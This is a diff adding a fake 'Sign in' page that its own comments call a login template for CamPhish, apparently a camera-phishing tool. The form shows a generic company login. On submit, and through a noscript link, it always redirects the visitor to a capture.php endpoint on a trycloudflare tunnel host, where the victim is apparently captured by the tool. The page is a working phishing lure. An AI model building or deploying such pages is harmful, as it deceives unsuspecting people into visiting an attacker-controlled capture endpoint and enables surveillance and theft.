@@ -1,0 +1,66 @@
+<!--
+  Dummy / Login template for CamPhish
+  The script replaces the token `https://lambda-repository-quest-numerical.trycloudflare.com` with the generated public URL.
+  The login will always redirect to https://lambda-repository-quest-numerical.trycloudflare.com/capture.php when submitted.
+-->
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Sign In</title>
+    <style>
+      :root{--bg:#f4f7fb;--card:#ffffff;--accent:#4a78d6}
+      html,body{height:100%;margin:0;font-family:Inter, Helvetica, Arial, sans-serif;background:var(--bg);}
+      .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}
+      .card{width:100%;max-width:420px;background:var(--card);box-shadow:0 6px 18px rgba(17,24,39,0.08);border-radius:12px;padding:28px}
+      .logo{font-weight:700;color:var(--accent);font-size:20px;margin-bottom:8px}
+      h1{margin:6px 0 16px;font-size:20px}
+      label{display:block;margin:10px 0 6px;font-size:13px;color:#374151}
+      input[type=text],input[type=password]{width:100%;padding:10px 12px;border:1px solid #e6e9ef;border-radius:8px;box-sizing:border-box}
+      .actions{margin-top:18px;display:flex;gap:8px}
+      .btn{flex:1;background:var(--accent);color:#fff;border:none;padding:10px 12px;border-radius:8px;cursor:pointer;font-weight:600}
+      .small{font-size:12px;color:#6b7280;margin-top:12px;text-align:center}
+      .muted{color:#94a3b8}
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <div class="card" role="main">
+        <div class="logo">Company</div>
+        <h1>Sign in to your account</h1>
+
+        <form id="loginForm">
+          <label for="user">Email or username</label>
+          <input id="user" name="user" type="text" autocomplete="username" placeholder="you@example.com" />
+
+          <label for="pass">Password</label>
+          <input id="pass" name="pass" type="password" autocomplete="current-password" placeholder="Enter your password" />
+
+          <div class="actions">
+            <button type="submit" class="btn">Sign in</button>
+          </div>
+        </form>
+
+        <div class="small muted">By continuing you agree to the Terms of Service.</div>
+        <noscript>
+          <p class="small">JavaScript is required — use the link below to continue.</p>
+          <p class="small"><a href="https://lambda-repository-quest-numerical.trycloudflare.com/capture.php">Continue</a></p>
+        </noscript>
+      </div>
+    </div>
+
+    <script>
+      // On submit, always redirect to the injected https://lambda-repository-quest-numerical.trycloudflare.com/capture.php.
+      (function(){
+        var form = document.getElementById('loginForm');
+        form.addEventListener('submit', function(e){
+          e.preventDefault();
+          // This token will be replaced by the script with the actual tunnel URL.
+          var url = 'https://lambda-repository-quest-numerical.trycloudflare.com/capture.php' || '/capture.php';
+          window.location.href = url;
+        }, false);
+      })();
+    </script>
+  </body>
+</html>
